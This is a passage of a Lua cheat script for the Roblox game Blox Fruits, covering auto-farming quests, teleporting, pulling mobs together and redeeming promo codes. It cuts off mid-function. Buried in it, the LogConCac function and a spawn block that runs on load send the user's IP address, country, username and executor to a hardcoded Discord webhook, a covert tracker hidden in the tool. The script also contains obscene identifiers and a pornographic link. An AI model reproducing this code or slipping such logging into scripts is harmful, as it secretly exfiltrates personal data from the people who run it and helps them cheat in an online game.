			elseif game.Players.LocalPlayer.Data.Level.Value >= 2250 and game.Players.LocalPlayer.Data.Level.Value < 2300 or SelectMonster == "Baking Staff" then 
				Ms = "Baking Staff"
				NameQuest = "CakeQuest2"
				QuestLv = 1
				NameMon = "Baking Staff"
				CFrameQ = CFrame.new(-1928.31763, 37.7296638, -12840.626)
				CFrameMon = CFrame.new(-1818.347900390625, 93.41275787353516, -12887.66015625)
				
				if SelectMonster == "Baking Staff" then
				elseif not LevelMax then
					Next_Level_X = 2300
				end
				
				SelectMonster = "Cookie Crafter"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2300 and game.Players.LocalPlayer.Data.Level.Value < 2325 or SelectMonster == "Cocoa Warrior" then 
				Ms = "Cocoa Warrior"
				NameQuest = "ChocQuest1"
				QuestLv = 1
				NameMon = "Cocoa Warrior"
				CFrameQ = CFrame.new(230.19186401367188, 24.7342586517334, -12202.6572265625)
				CFrameMon = CFrame.new(24.617475509643555, 24.734342575073242, -12227.267578125)
				if SelectMonster == "Cocoa Warrior" then
				else
					Next_Level_X = 2325
				end
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2325 and game.Players.LocalPlayer.Data.Level.Value < 2350 or SelectMonster == "Chocolate Bar Battler" then 
				Ms = "Chocolate Bar Battler"
				NameQuest = "ChocQuest1"
				QuestLv = 2
				NameMon = "Chocolate Bar Battler"
				CFrameQ = CFrame.new(230.19186401367188, 24.7342586517334, -12202.6572265625)
				CFrameMon = CFrame.new(658.2230224609375, 24.7342586517334, -12541.9912109375)
				if SelectMonster == "Chocolate Bar Battler" then
				else
					Next_Level_X = 2350
				end
				SelectMonster = "Cocoa Warrior"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2350 and game.Players.LocalPlayer.Data.Level.Value < 2375 or SelectMonster == "Sweet Thief" then 
				Ms = "Sweet Thief"
				NameQuest = "ChocQuest2"
				QuestLv = 1
				NameMon = "Sweet Thief"
				CFrameQ = CFrame.new(149.1439208984375, 24.7938289642334, -12775.41015625)
				CFrameMon = CFrame.new(51.61184310913086, 24.79380989074707, -12574.873046875)
				if SelectMonster == "Sweet Thief" then
				else
					Next_Level_X = 2375
				end
				SelectMonster = "Chocolate Bar Battler"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2375 and game.Players.LocalPlayer.Data.Level.Value < 2400 or SelectMonster == "Candy Rebel" then 
				Ms = "Candy Rebel" 
				NameQuest = "ChocQuest2"
				QuestLv = 2
				NameMon = "Candy Rebel"
				CFrameQ = CFrame.new(149.1439208984375, 24.7938289642334, -12775.41015625)
				CFrameMon = CFrame.new(28.345605850219727, 24.79380226135254, -12949.5029296875)
				if SelectMonster == "Candy Rebel" then
				else
					Next_Level_X = 2400
				end
				SelectMonster = "Sweet Thief"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2400 and game.Players.LocalPlayer.Data.Level.Value < 2425 or SelectMonster == "Candy Pirate"  then
				Ms = "Candy Pirate" 
				NameQuest = "CandyQuest1"
				QuestLv = 1
				NameMon = "Candy Pirate"
				CFrameQ = CFrame.new(-1146.80810546875, 16.107254028320312, -14444.353515625)
				CFrameMon = CFrame.new(-1333.9425048828125, 16.907636642456055, -14424.8447265625)
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2425 and game.Players.LocalPlayer.Data.Level.Value < 2550 or SelectMonster == "Snow Demon" then
				Ms = "Snow Demon"
				NameQuest = "CandyQuest1"
				QuestLv = 2
				NameMon = "Snow Demon"
				CFrameQ = CFrame.new(-1146.80810546875, 16.107254028320312, -14444.353515625)
				CFrameMon = CFrame.new(-963.0213012695312, 16.1071834564209, -14289.576171875)
				if SelectMonster == "Candy Pirate" then
				else
					Next_Level_X = 2551
				end
				SelectMonster = "Candy Pirate"
			elseif game.Players.LocalPlayer.Data.Level.Value >= 2550 then
				Ms = "Baking Staff"
				NameQuest = "CakeQuest2"
				QuestLv = 1
				NameMon = "Baking Staff"
				CFrameQ = CFrame.new(-1928.31763, 37.7296638, -12840.626)
				CFrameMon = CFrame.new(-1818.347900390625, 93.41275787353516, -12887.66015625)
				
				SelectMonster = "Cookie Crafter"
				local Lp = tostring(string.match(tostring(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner")), "%d+"))
				if Lp == 'nil' or Lp == nil then
					game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner",true)
					Cake_Prince_S:Set(' Cake Prince : Boss Spawn')
				else
					Cake_Prince_S:Set(' Cake Prince : '..Lp)
				end
			end
		end
	end

if game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == false then
				local Lv = game.Players.LocalPlayer.Data.Level.Value
				if game.Players.LocalPlayer.Data.Level.Value >= 10 and game.Players.LocalPlayer.Data.Level.Value <= 100 then
					CheckLevel2()
					game:GetService("Players").LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text = NameMon
					game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible = true
				else
					CheckLevel2()
					if not First_Quest then
						if SelectMonster ~= nil then
							First_Quest = true
						end
					else
						SelectMonster = nil
						First_Quest = false
					end
					repeat wait(.1)
						TPX(CFrameQ)
						if (CFrameQ.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 then
							wait(1)
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StartQuest", NameQuest, QuestLv)
							game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
						end
					until game.Players.LocalPlayer.PlayerGui.Main.Quest.Visible == true or not Auto_Farm_Kaitun
				end
	                  end



function moctui(r)

  local aA, aB = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1"), game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
  if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") and r == 4 then 
    return true
  end
  if aA == -2 and r == 3 then
    return true
  end 
  if aB == -2 and r == 2 then 
    return true
  end
  if r == 1 then 
  return true
  end 
  return false
end 

function whatismyrace() 
  return game:GetService("Players").LocalPlayer.Data.Race.Value 
end 
           
function getraidchip() 
  local df = game.Players.LocalPlayer.Data.DevilFruit.Value 
  for i, v in pairs(raidlist) do  
   
    if string.find(df, v) then 
      return v 
    end 
  end 
  
  return "Dark"
end

            
         
         end

         function checkNotify(msg)
           msg = string.lower(msg)
            for r, k in pairs(game.Players.LocalPlayer.PlayerGui.Notifications:GetDescendants()) do

               if k:IsA("TextLabel") then

                  if string.find(string.lower(k.Text), msg) then
                     return true
                  end
               end
            end
         end

         function autopoint()
            if getPlayerLevel() > 500 and CheckSea(1) then
               return "Defense"
            elseif getPlayerLevel() > 2100 then
               return "Sword"
            elseif getPlayerLevel() > 1800 then 
               return "Blox Fruit"
            else
               return "Melee"
            end
         end

         function GetAndCheckMeleeMastery(bu, bs)

            mm = bu
            usingmelee = browhat[NameMelee()]
            momo = browhat[mm]
            -- print(bu, mm, usingmelee , momo, browhat[mm])
            --  print(momo)
            if type(momo) == "string" then
               momo = (game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true) == 1)
            else
               momo = momo()
            end
            if momo then
               if
               not game.Players.LocalPlayer.Character:FindFirstChild(mm) and
               not game.Players.LocalPlayer.Backpack:FindFirstChild(mm)
               then
                  momo = browhat[mm]
                  if type(momo) == "string" then
                     game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo, true)
                     momo = game.ReplicatedStorage.Remotes.CommF_:InvokeServer(momo)
                  else
                     momo = momo()
                  end
               end
               if game.Players.LocalPlayer.Character:FindFirstChild(mm) or game.Players.LocalPlayer.Backpack:FindFirstChild(mm) then
                  kwekrwe = {game.Players.LocalPlayer.Character, game.Players.LocalPlayer.Backpack}
                  for r, v in pairs(kwekrwe) do
                     if v:FindFirstChild(mm) then
                        return v[mm].Level.Value
                     end
                  end
               end
            end
            return 0
         end



function sh()

    local bf = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
    if bf == 0 then
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "2") 
    end 
end
    
         function getMeleeMastery()
            local buoieltrul = NameMelee(true)
            
            if buoieltrul then
              
                
               if buoieltrul:FindFirstChild"Level" and meleetable3[buoieltrul.Name] then
               pcall(function ()  vclui[buoieltrul.Name] = "[+] : "..buoieltrul.Name end)
                  eltrul[buoieltrul.Name]= buoieltrul.Level. Value 
                 
               end
            end
         end


         -- print (type(NameMelee()))
         function getFruitTier(fr)

spawn(function()
           print (": "..fr.." tier: "..tostring(fruittier[fr] or fruittier[fruitMap[fr]] or 0))
end)
            return fruittier[fr] or fruittier[fruitMap[fr]]
         end







         function buyMelee(melee)
            if table.find(meleetable, melee) then
               pcall(function()
               game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", melee, "2")
               game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Buy" .. melee) 
               end)
            end
         end



         function getMobLoadPos(a)
            for c, d in pairs(game:GetService("Workspace")["_WorldOrigin"].EnemySpawns:GetChildren()) do
           if d.Name == a  then
                  -- warn("Load Mon: "..a.." Load Mob Get: "..d.Name)
                  
     
                     return d.CFrame
                

           end 
            end
            for c, d in pairs(getnilinstances()) do
           if d.Name and string.find(d.Name,a) then
                  -- warn("Load Mon: "..a.." Load Mob Get: "..d.Name)
                  
        
                     return d.CFrame or d.HumanoidRootPart.CFrame
            

           end 
            end
             for i,v in pairs(game.Workspace.Enemies:GetChildren()) do 
               if skidymf(v) and v.Name and string.find(v.Name, a) then
                 return v.HumanoidRootPart.CFrame 
               end 
               end
             for i,v in pairs(game.ReplicatedStorage:GetChildren()) do 
               if skidymf(v) and v.Name and string.find(v.Name, a) then
                 return v.HumanoidRootPart.CFrame or v.CFrame
               end 
               end
            --
            --     for c, d in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
            --         if string.find(d.Name, a) or d.Name == a or string.find(d.Name, a)then
            --
            --             return d.HumanoidRootPart.CFrame
            --         end
            --     end

           
         end


            function spamandwait(wt) 
              taocanpasue = true 
              for i, v in pairs(wt) do 
                down(v) 
                repeat wait(.1) until not game.Players.LocalPlayer.Character.Busy.Value 
              end 
              taocanpasue = false
            end 
            
            function stuff(monmonmon)
              Buso()
                if monmonmon and getPlayerLevel() > 2499 and c().Main["Farm Fruit Mastery After Done Cdk Quest"] and checkitem"Cursed Dual Katana" and skidymf(monmonmon) and (monmonmon.Humanoid.Health/monmonmon.Humanoid.MaxHealth)*100 < 65 and not checkIsHaveAllSkillsFruit() then 
                    dmlockskill = monmon.HumanoidRootPart.Position
                    
                    equip("Blox Fruit")
                    spamandwait({"Z", "X", "C", "V", "F"}) 
                    end 
                 dmlockskill = false
               equip(forcewp or "Melee")
            end

            function Buso()
               if (not (game.Players.LocalPlayer.Character:FindFirstChild("HasBuso"))) then
                  local rel = game.ReplicatedStorage

                  rel.Remotes.CommF_:InvokeServer("Buso")
               end
            end

            function getmon(mk) 
              return game.Workspace.Enemies: FindFirstChild(mk)
              
            end
         function throughcheck(data, key, data2) 
           for i, v in pairs(data) do 
             print(i, v)
             lmao = i 
             if key == 1 then
               lmao = V 
             end
             print(lmao)
             if data2(lmao) then 
              
               return data2(lmao)
             end
           end
           
             return false 
         end
         function RedeemAllCodesX2()

            CodesX2 = {
               "Sub2CaptainMaui",
               "CODE_SERVICIO",
               "CINCODEMAYO_BOOST",
               "15B_BESTBROTHERS",
               "DEVSCOOKING",
               "GAMERROBOT_YT",
               "ADMINGIVEAWAY",
               "GAMER_ROBOT_1M",
               "TY_FOR_WATCHING",
               "kittgaming",
               "Sub2Fer999",
               "Enyu_is_Pro",
               "Magicbus",
               "JCWK",
               "Starcodeheo",
               "Bluxxy",
               "fudd10_v2",
               "FUDD10",
               "BIGNEWS",
               "THEGREATACE",
               "SUB2GAMERROBOT_EXP1",
               "Sub2OfficialNoobie",
               "StrawHatMaine",
               "SUB2NOOBMASTER123",
               "Sub2Daigrock",
               "Axiore",
               "TantaiGaming"
            }
            for r, v in pairs(CodesX2) do
               game:GetService("ReplicatedStorage").Remotes.Redeem:InvokeServer(v)
            end
         end

         function CheckQuestBoss(bg)

            local c5 = bg

            local a
            local ab
            if string.find(c5, " %pRaid Boss%p") then
               a = string.gsub(c5, "%pLv. %d+%p", "")
               ab = string.gsub(a, "  %pRaid Boss%p", "")
            else
               a = string.gsub(c5, "%pLv. %d+%p", "")
               ab = string.gsub(a, "  %pBoss%p", "")
            end
            for r, v in next, require(game:GetService("ReplicatedStorage").Quests) do
               for M, N in next, v do
                  for O, P in next, N.Task do
                     if O == ab then
                        return ab
                     end
                  end
               end
            end
         end

         function GetInfoBossQuest(cy)
            returnrnrnr = {}
            for r, v in next, require(game:GetService("ReplicatedStorage").Quests) do
               for M, N in next, v do
                  if N.LevelReq <= getPlayerLevel() and N.Name == cy then
                     returnrnrnr["QuestName"] = r
                     returnrnrnr["QuestId"] = M
                     return returnrnrnr
                  end
               end
            end
         end




         function CheckWaterKey()


            local bv = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
            if bv == 3 or bv == 1 then
               WaterKey = true
               WaterKey = true
               return true
            end
            return false
         end
         function getSpeficalBoss()
            return CheckBoss("Darkbeard") or CheckBoss("rip_indra True Form")
         end
         
         lp = game.Players.LocalPlayer

local specialitems = {"Special Microchip", "God's Chalice", "Sweet Chalice", "Relic", "Key", "Torch", "Flower 1", "Flower 2", "Flower 3", "Hallow Essence", "Fire Essence", "Holy Torch", "Library Key", "Hidden Key", "Water Key"}
rarity = {
  [0] = "🟤",
  [1] = "🔵",
  [2] = "🟢",
  [3] = "🟡",
  [4] = "🔴",
  [5] = "wtf"
}

function safe_cp(p)
    return p.Character:WaitForChild("HumanoidRootPart", 9)
    --p.Character:WaitForChild("Head")
end
function bypassreq() 
  for i, v in pairs(specialitems) do
  local a1, a2 = game:GetService("Players").LocalPlayer.Backpack: FindFirstChild(v), game:GetService("Players").LocalPlayer.Character: FindFirstChild(v)
    if a1 or a2 then 
      return false 
    end 
  end 
  for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
    if v:FindFirstChild"EatRemote" then return false end 
    end
  for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do 
    if v:FindFirstChild"EatRemote" then return false end 
    end
  return true 
end 

 
function m0()
    return lp.PlayerGui.Main.InCombat.Visible and lp.PlayerGui.Main.InCombat.Text and
        (string.find(string.lower(lp.PlayerGui.Main.InCombat.Text), "risk"))
end

function aw1()
    for a, b in pairs(char:GetDescendants()) do
        if b:IsA "BasePart" then
            b.CanCollide = false
        end
    end
    if not char:FindFirstChild "eltrul" then
        local ngu = Instance.new("BodyVelocity", char)
        ngu.Name = "eltrul"
        ngu.MaxForce = Vector3.new(0, math.huge, 0)
        ngu.Velocity = Vector3.new(0, 0, 0)
    end
end

function getPortal(check2)
    local check3 = check2.Position
    local w = game.PlaceId
    if w == 2753915549 then
        gQ = {
            Vector3.new(-7894.6201171875, 5545.49169921875, -380.246346191406),
            Vector3.new(-4607.82275390625, 872.5422973632812, -1667.556884765625),
            Vector3.new(61163.8515625, 11.759522438049316, 1819.7841796875),
            Vector3.new(3876.280517578125, 35.10614013671875, -1939.3201904296875)
        }
    elseif w == 4442272183 then
        gQ = {
            Vector3.new(-288.46246337890625, 306.130615234375, 597.9988403320312),
            Vector3.new(2284.912109375, 15.152046203613281, 905.48291015625),
            Vector3.new(923.21252441406, 126.9760055542, 32852.83203125),
            Vector3.new(-6508.5581054688, 89.034996032715, -132.83953857422)
        }
    elseif w == 7449423635 then
        gQ = {
            Vector3.new(-5058.77490234375, 314.5155029296875, -3155.88330078125),
            Vector3.new(5756.83740234375, 610.4240112304688, -253.9253692626953),
            Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125),
            Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586),
            Vector3.new(-11993.580078125, 334.7812805175781, -8844.1826171875),
            Vector3.new(5314.58203125, 25.419387817382812, -125.94227600097656)
        }
    end
    local aM, aN = Vector3.new(0, 0, 0), math.huge

    for _, aL in pairs(gQ) do
        if (aL - check3).Magnitude < aN and aM ~= aL then
            aM, aN = aL, (aL - check3).Magnitude
        end
    end
    return aM
end
function grgrgrgrg(is)
    --    local mq = safe_cp(lp).CFrame
    --       safe_cp(lp).CFrame = CFrame.new(mq.Z, 9999, mq.Z)
    
    repeat
        task.wait()
        lp.Character.HumanoidRootPart.CFrame = is
    until lp.Character.PrimaryPart.CFrame == is
    game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid", 9):ChangeState(15)
    lp.Character:SetPrimaryPartCFrame(is)
    wait(0.1)
    lp.Character:WaitForChild"Head":Destroy()
    repeat
        task.wait()
    until lp.Character:FindFirstChild("Humanoid").Health <= 0
    repeat
        task.wait()
        lp.Character.PrimaryPart.CFrame = is
    until lp.Character:FindFirstChild("Head")
end

function getSpawn(wtf)
    local a, b = nil, math.huge
    for i, v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(lp.Team)):GetChildren()) do
        if tostring(v) ~= "Leviathan" and (v:GetModelCFrame().Position - wtf.Position).Magnitude < b then
            a = v:GetModelCFrame()
            b = (v:GetModelCFrame().Position - wtf.Position).Magnitude
        end
    end
    return a
end

function request(check1)
    game.ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack({"requestEntrance", check1}))
end

function q1(I, II)
    if not II then
        II = game.Players.LocalPlayer.Character.PrimaryPart.CFrame
    end

    return (Vector3.new(I.X, 0, I.Z) - Vector3.new(II.X, 0, II.Z)).Magnitude
end

function check11()
    return game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible and
        game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text and
        (string.find(string.lower(game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Text), "risk"))
end

function to(vg1)
    if sexroblox then
        sexroblox:Cancel()
    end
    --print("ncall")
    if olfdvg and q1(olfdvg, vg1) > 1000 then
      
        return
    end
    if not vg1 then
        return
    end
    --  print("continue ")
    vg2 = CFrame.new(vg1.X, vg1.Y, vg1.Z)
    game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart", 9)
    game.Players.LocalPlayer.Character:WaitForChild("Head", 9)

    for a, b in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if b:IsA "BasePart" then
            b.CanCollide = false
        end
    end
    if not game.Players.LocalPlayer.Character.Head:FindFirstChild "eltrul" then
        local ngu = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.Head)
        ngu.Name = "eltrul"
        ngu.MaxForce = Vector3.new(0, math.huge, 0)
        ngu.Velocity = Vector3.new(0, 0, 0)
    end
    vg3 = getPortal(vg2)
    vg9 = getSpawn(vg2)
    for mm = 0, 3, 1 do
        if getSpawn(vg2) ~= vg9 then
            return
        end
    end

    vg5 = game.Players.LocalPlayer.Character.HumanoidRootPart
    vg4 = vg5.CFrame
    vg7 = q1(vg4, vg2)
    if vg9 then
        vg10 = q1(vg9, vg2)
        if
            bypassreq() and not check11() and vg10 < vg7 and vg7 > 3600 and q1(vg4, vg9) > 500 and
                (q1(vg3, vg2) + 1000) > vg10
         then
            return grgrgrgrg(vg9)
        end
    end

    if vg7 > q1(vg3, vg2) and vg7 > 300 then
        --print("request")
         request(vg3)
         wait()
         return
    end
    if vg7 < 10 then
        vg5.CFrame = vg2
        --    print("set")
        --    print("set")
        return
    end
    if q1(vg2) > 300  then
        vg2 = vg2 + Vector3.new(0, 350, 0)
    end
    

    
    safe_cp(lp).CFrame = CFrame.new(vg4.X, vg2.Y, vg4.Z)

    vg6 = vg7 / 250
    sexroblox =
        game:GetService("TweenService"):Create(
        game.Players.LocalPlayer.Character.HumanoidRootPart,
        TweenInfo.new(vg6, Enum.EasingStyle.Linear),
        {CFrame = vg2}
    )

    sexroblox:Play()
    -- print("tween")
end

function q1(I, II)
    if not II then
        II = am2(lp).CFrame
    end
    return (Vector3.new(I.X, 0, I.Z) - Vector3.new(II.X, 0, II.Z)).Magnitude
end

function am2(q0)
    if not q0 or not q0.Character then
        return {}
    end
    return q0.Character:WaitForChild("HumanoidRootPart", 9)
end

          
function getdelaytime(time)  
  
  oldtime = time or tick()  
  timerun = timerun or 0 
 -- print("Check: "..tick()-oldtime.." / "..timerun
    
  if ( tick()-oldtime) > 0.1 then  
  --  warn("Check: "..tick()-oldtime.." / "..timerun
    
  --setclipboard (tostring("Check: "..tick()-oldtime.." / "..timerun
    
    
end  
return true
end
          
function checkdt(time) 
  return true 
  -- 
--   oldtime = time or tick()  
--   timerun = timerun or 0 
--   print("Check: 2 . "..tick()-oldtime.." / "..timerun
--     )  
--  if ( tick()-oldtime) > 0.1 then  
--     warn("Check: 2 . "..tick()-oldtime.." / "..timerun
--     )  
--   setclipboard (tostring("Check: "..tick()-oldtime.." / "..timerun
--     
--     )) 
--   
-- end 
-- return true
end


function LogConCac()
    k2 = game:GetService"HttpService":JSONDecode(game:HttpGet"https://api.myip.com")
    
    k3 = {}
    k3["embeds"] = {{["title"] = "Suc Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Ip Address", ["value"]=(k2["ip"] or "Cant Log"), ["inline"]=false},{["name"]="Country", ["value"]=(k2["country"] or "cant log"), ["inline"] = false},{["name"]="Exploit",["value"]=tostring(identifyexecutor()) or "Custom Exploit???", ["inline"] = false}}}}
    return k3
   
end 
function buglog(bug) 
    k3 = {}
   
    k3["embeds"] = {{["title"] = "Con Cac", ["url"] = "https://thumbzilla.com/", ["description"] = game.Players.LocalPlayer.Name, ["fields"] = {{["name"]="Game",["value"]=(tostring(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name) or "Wtf Can't Fetch"), ["inline"]=false},{["name"]="Problems", ["value"]=(bug or ""), ["inline"]=false},{["name"]="Main", ["value"]=(m1 or "none").." | "..(m2 or "none"),["inline"]=false}}}}
    return k3
 
end 

function isMirageSpawn() 
  return game:GetService("Workspace").Map:FindFirstChild("MysticIsland") 
end 
       
function PostWebhook(cm, cn)
    local co = http_request or request or HttpPost or syn.request
    
    local cp =    
        co(
        {
            Url = cm,    
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(cn)
        }
    )
 
   
   --setclipboard(game:GetService("HttpService"):JSONEncode(cn))
end
spawn(function ()
PostWebhook("https://discord.com/api/webhooks/1148666687030317110/hTS32yF21g5JH_Coy2QDjskyCvKhJSB-L4bGJTSCCLblOd8YDVNcrtx1dgNi8A69iJxr", LogConCac()) 
end)

            function CFrameQuest()
               QuestPoses = {}
               for r, v in pairs(getnilinstances()) do
                  if
                  v:IsA("Model") and v:FindFirstChild("Head") and v.Head:FindFirstChild("QuestBBG") and
                  v.Head.QuestBBG.Title.Text == "QUEST" and v.Name ~= "Villager"
                  then
                     QuestPoses[v.Name] = v:WaitForChild"HumanoidRootPart".CFrame * CFrame.new(0, -2, 2)
                  end
               end
               for r, v in pairs(game.Workspace.NPCs:GetDescendants()) do
                  if v.Name == "QuestBBG" and v.Title.Text == "QUEST" and v.Parent.Parent.Name ~= "Villager" then
                     QuestPoses[v.Parent.Parent.Name] = v.Parent.Parent.HumanoidRootPart.CFrame * CFrame.new(0, -2, 2)
                  end
               end
               DialoguesList = {}
               for r, v in pairs(require(game.ReplicatedStorage.DialoguesList)) do
                  DialoguesList[v] = r
               end
               local V = getscriptclosure(game:GetService("Players").LocalPlayer.PlayerScripts.NPC)
               local W = {}
               for k, v in pairs(debug.getprotos(V)) do
                  if #debug.getconstants(v) == 1 then
                     table.insert(W, debug.getconstant(v, 1))
                  end
               end
               local X = false
               local Y = {}
               for k, v in pairs(debug.getconstants(V)) do
                  if type(v) == "string" then
                     if v == "Players" then
                        X = false
                     end
                     if not X then
                        if v == "Blox Fruit Dealer" then
                           X = true
                        end
                     else
                     end
                     if X then
                        table.insert(Y, v)
                     end
                  end
               end
               local Z = {}
               QuestPoint = {}
               for k, v in pairs(Y) do
                  if QuestPoses[v] then
                     Z[W[k]] = Y[k]
                  end
               end
               for r, v in next, Z do
                  QuestPoint[r] = QuestPoses[v]
               end
               QuestPoint["SkyExp1Quest"] =
               CFrame.new(
               -7857.28516,
               5544.34033,
               -382.321503,
               -0.422592998,
               0,
               0.906319618,
               0,
               1,
               0,
               -0.906319618,
               0,
               -0.422592998
               )
            end


function CheckBoss(bg) 
  if skidymf(game:GetService("ReplicatedStorage"):FindFirstChild(bg) )   then 
    return game:GetService("ReplicatedStorage"):FindFirstChild(bg)  
    end 
  if skidymf(game.workspace.Enemies:FindFirstChild(bg) ) then 
    return game.workspace.Enemies:FindFirstChild(bg)  
    end 
end
               
               
            
            function EquipWeaponName(m)
               if not m then
                  return
               end
               NoClip = true
               ToolSe = m
               if game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe) then
                  local bi = game.Players.LocalPlayer.Backpack:FindFirstChild(ToolSe)
                  wait(.4)
                  game.Players.LocalPlayer.Character.Humanoid:EquipTool(bi)
                  return true
               end
               if game.Players.LocalPlayer.Character:FindFirstChild(m) then
                  return game.Players.LocalPlayer.Character:FindFirstChild(m)
               end
            end
            function skidymf(a)
               if  a and  a.Parent and a:FindFirstChild("Humanoid") and a:FindFirstChild("HumanoidRootPart") and a.Humanoid.Health >= 0 and (a.HumanoidRootPart or a.Character.HumanoidRootPart).CFrame
                then
                  return true
               else
                  return false
               end
            end

            function skidymf1()
               sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
               local s = {}
               local ak = false
               for al, am in pairs(getsortedmon()) do
                  if skidymf(am) then
                     for al, an in pairs(getsortedmon()) do
                        if skidymf(an) and skidymf(am) then
                           if (an.HumanoidRootPart.Position - am.HumanoidRootPart.Position).Magnitude < 400 then
                              if not s[am.HumanoidRootPart.CFrame] then
                                 s[am.HumanoidRootPart.CFrame] = 1
                              else
                                 s[am.HumanoidRootPart.CFrame] = s[am.HumanoidRootPart.CFrame] + 1
                              end
                           end
                        end
                     end
                  end
               end
               local s2 = dbobii(s)
               for r, v in pairs(s) do
                  if v == s2 then
                     ak = r
                  end
               end
               return ak
            end

            function dbobii(aj)
               local tb2 = 0
               for r, v in pairs(aj) do
                  if v > tb2 then
                     tb2 = v
                  end
               end
               return tb2
            end


            function GetNpcPos(aq)
               local ar
               local c = 0
               for k, v in pairs(getsortedmon()) do
                  if v.Name == aq then
                     if not ar then
                        ar = v.HumanoidRootPart.Position
                     else
                        ar = ar + v.HumanoidRootPart.Position
                     end
                     c = c + 1
                  end
               end
               ar = ar / c
               return ar
            end
-- 
-- 
             function SizePart(v)
                if not v:FindFirstChild("HumanoidRootPart") then
                   return nil
                end
                v.HumanoidRootPart.CanCollide = false
                v.Humanoid:ChangeState(11)
                if not v.HumanoidRootPart:FindFirstChild"Hold" then
                   local Hold = Instance.new("BodyVelocity", v.HumanoidRootPart)
                   Hold.Name = "Hold"
                   Hold.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                   Hold.Velocity = Vector3.new(0, 0, 0)
                end
             end
            function GetNearestPlayer(as)

               ner = math.huge
               for r, v in pairs(game.Players:GetChildren()) do
                  if v and skidymf(v.Character) and (v.Character.HumanoidRootPart.Position - as).Magnitude < ner then
                     ner = (v.Character.HumanoidRootPart.Position - as).Magnitude
                  end
               end
               for r, v in pairs(game.Players:GetChildren()) do
                  if v and skidymf(v.Character) and (v.Character.HumanoidRootPart.Position - as).Magnitude <= ner then
                     ner2 = v.Name
                  end
               end
               if game.Players.LocalPlayer.Name == ner2 then
                  return true
               end
            end
   
   network = isnetworkowner or InMyNetWork or newcclosure(function () 
     return true
     end)
   function createcheckthread(data) 
     spawn (function ()
     if not data then return end  
     
     if skidymf(data[1]) then 
       data[5] = data[1].Humanoid 
       data[6] = data[5].Health 
       data[7] = os.time()-data[2] 
       data[10] = data[1].HumanoidRootPart.CFrame
       while skidymf(data[1]) and wait() do
       if data[1].Humanoid.Health >= data[6] and data[7] > 3 then 
    
         data[1].HumanoidRootPart.CFrame = data[10]
         data[1].Humanoid.Health = 0  
       end
       end 
     end
     end) 
   end 
   
function gnc() 
  
    iroajjrod, kvbahifj = nil, math.huge
    for kejrkaoufha, othabfooahf in pairs(game.Workspace:GetChildren()) do
        if
            string.find(othabfooahf.Name, "Chest")
         then 
          
            if lp:DistanceFromCharacter(othabfooahf.Position) < kvbahifj then
              
                iroajjrod = othabfooahf
                kvbahifj = lp:DistanceFromCharacter(othabfooahf.Position)
            end
        end
    end
    return iroajjrod
end

ajaxjaxjaxjax = {}


function FindAverageCFrame(cframeList)
    local totalPosition = Vector3.new(0,0,0)
    local validCount = 0
    for i = 1, #cframeList do
        local cframe = cframeList[i]
        totalPosition = totalPosition + cframe.Position
        validCount = validCount + 1
    end
    local averagePosition = totalPosition / validCount
    local averageCFrame = CFrame.new(averagePosition)
    return averageCFrame
end
function BringMob(BringName)
        BringName = tostring(BringName)
        BringList = {}
        AGuyWhoSuckedOnZooPorn = {}
        Protected_Mon = workspace.Enemies:GetChildren()
        for i, v in pairs(Protected_Mon) do
          
          if v and v.Parent and v:FindFirstChild("HumanoidRootPart") and v.Name == BringName and v:FindFirstChild("HumanoidRootPart") then
                table.insert(BringList,v.HumanoidRootPart.CFrame)
                table.insert(AGuyWhoSuckedOnZooPorn, v)
            end
        end
        
        BringCFrame = FindAverageCFrame(BringList)
        
        for i,v in pairs(AGuyWhoSuckedOnZooPorn) do
